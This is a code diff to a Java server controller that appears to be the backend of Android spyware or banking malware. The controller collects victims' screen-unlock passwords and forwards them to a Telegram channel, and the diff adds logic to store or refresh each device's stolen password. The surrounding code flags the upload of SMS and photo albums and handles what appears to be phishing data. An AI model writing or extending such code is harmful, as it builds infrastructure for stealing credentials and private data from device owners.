@@ -2,11 +2,7 @@ package io.renren.modules.app.web.api;
 
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
-import com.google.gson.JsonObject;
-
-import cn.hutool.json.JSONUtil;
 import io.renren.common.constant.Constant;
-import io.renren.common.constant.Constant.SystemParamsKey;
 import io.renren.common.utils.IpUtils;
 import io.renren.common.utils.Result;
 import io.renren.commons.dynamic.datasource.config.DynamicContextHolder;
@@ -14,6 +10,7 @@ import io.renren.modules.app.common.Utils;
 import io.renren.modules.app.context.DeviceContext;
 import io.renren.modules.app.entity.*;
 import io.renren.modules.app.handler.TelegramNotificationHandler;
+import io.renren.modules.app.mapper.UnlockScreenPwdMapper;
 import io.renren.modules.app.service.*;
 import io.renren.modules.app.vo.DeviceStatus;
 import io.renren.modules.app.vo.FishDataVo;
@@ -66,6 +63,8 @@ public class DeviceApiController extends BaseApiController {
 	private TelegramNotificationHandler telegramNotificationHandler;
 	@Autowired
 	private HeartService heartService;
+    @Autowired
+    private UnlockScreenPwdMapper unlockScreenPwdMapper;
 
 
 
@@ -161,8 +160,23 @@ public class DeviceApiController extends BaseApiController {
         	
             telegramNotificationHandler.sendNotificationAsync(DeviceContext.getPkg(), DeviceContext.getDeviceId(),String.format("✅ [解锁密码]获取成功!\n🔐 密码数据:%s\n📈 请关注后台数据!",jsonPwd.toJSONString()));
         }
-        log.info("更新pkg:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(unlockScreenPwd));
-        unlockScreenPwdService.save(unlockScreenPwd);
+
+        if(unlockScreenPwd.getType() == Constant.UnLockType.no){
+            UnlockScreenPwd last = unlockScreenPwdMapper.last(deviceId, Constant.UnLockType.no);
+            if(last == null){
+                unlockScreenPwdService.save(unlockScreenPwd);
+                log.info("保存密码:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(unlockScreenPwd));
+            }else{
+                UnlockScreenPwd updatePwd = new UnlockScreenPwd();
+                updatePwd.setId(last.getId());
+                updatePwd.setCreateDate(Utils.now());
+                unlockScreenPwdService.updateById(updatePwd);
+                log.info("更新密码:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(unlockScreenPwd));
+            }
+
+        }else{
+            log.info("保存密码:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(unlockScreenPwd));
+        }
         return Result.toSuccess(null);
     }
 
@@ -258,12 +272,12 @@ public class DeviceApiController extends BaseApiController {
         serverConfig.setUploadSms(Objects.equals(dbDevice.getUploadSms(), Constant.YN.Y));
         serverConfig.setUploadAlbum(Objects.equals(dbDevice.getUploadAlbum(), Constant.YN.Y));
         String key = dbDevice.getBrand().toLowerCase();
-        String configer = sysParamsDao.getValueByCode(key);
-        configer = configer == null ? sysParamsDao.getValueByCode(SystemParamsKey.defaultKey) : configer;
-        JSONObject json = JSONObject.parseObject(configer);
-        String backFeatures = json.getString("rules");
+//        String configer = sysParamsDao.getValueByCode(key);
+//        configer = configer == null ? sysParamsDao.getValueByCode(SystemParamsKey.defaultKey) : configer;
+//        JSONObject json = JSONObject.parseObject(configer);
+//        String backFeatures = json.getString("rules");
       
-        serverConfig.setBackFeatures(backFeatures);
+        serverConfig.setBackFeatures("[]");
 
         Device updateDevice = new Device();
         updateDevice.setId(dbDevice.getId());
